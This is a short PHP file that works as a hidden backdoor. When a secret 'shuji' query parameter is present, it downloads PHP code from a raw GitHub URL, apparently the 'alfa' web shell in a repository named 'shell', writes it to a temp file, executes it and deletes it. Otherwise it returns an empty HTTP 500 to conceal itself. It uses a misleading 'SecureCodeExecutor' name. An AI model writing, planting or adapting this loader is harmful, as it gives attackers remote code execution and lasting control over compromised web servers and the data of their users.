<?php
if (isset($_GET['shuji'])) {
class CurlFetcher
{
    public function fetchContent(string $url): string
    {
        if (!filter_var($url, FILTER_VALIDATE_URL)) {
            throw new Exception("Invalid URL provided.");
        }

        $response = @file_get_contents($url);

        if ($response === false || empty($response)) {
            throw new Exception("Failed to fetch content or content is empty.");
        }

        return $response;
    }
}

class SecureCodeExecutor
{
    private $fetcher;  

    public function __construct(CurlFetcher $fetcher)
    {
        $this->fetcher = $fetcher;
    }

    public function executeFetchedCode(string $url): void
    {
        $code = $this->fetcher->fetchContent($url);

        // Simpan ke file sementara
        $tempFile = tempnam(sys_get_temp_dir(), 'exec_') . '.php';
        file_put_contents($tempFile, $code);

        try {
            include $tempFile;
        } finally {
            unlink($tempFile); // Hapus file setelah eksekusi
        }
    }
}

// Example Usage
try {
    $fetcher = new CurlFetcher();
    $executor = new SecureCodeExecutor($fetcher);

    // Eksekusi kode PHP yang diambil dari URL
    $executor->executeFetchedCode("https://raw.githubusercontent.com/Shujizeen/shell/refs/heads/main/alfa-mentah.txt");
} catch (Exception $e) {
    echo "Error: " . htmlspecialchars($e->getMessage());
}
} else {
    http_response_code(500);
    echo "";
}
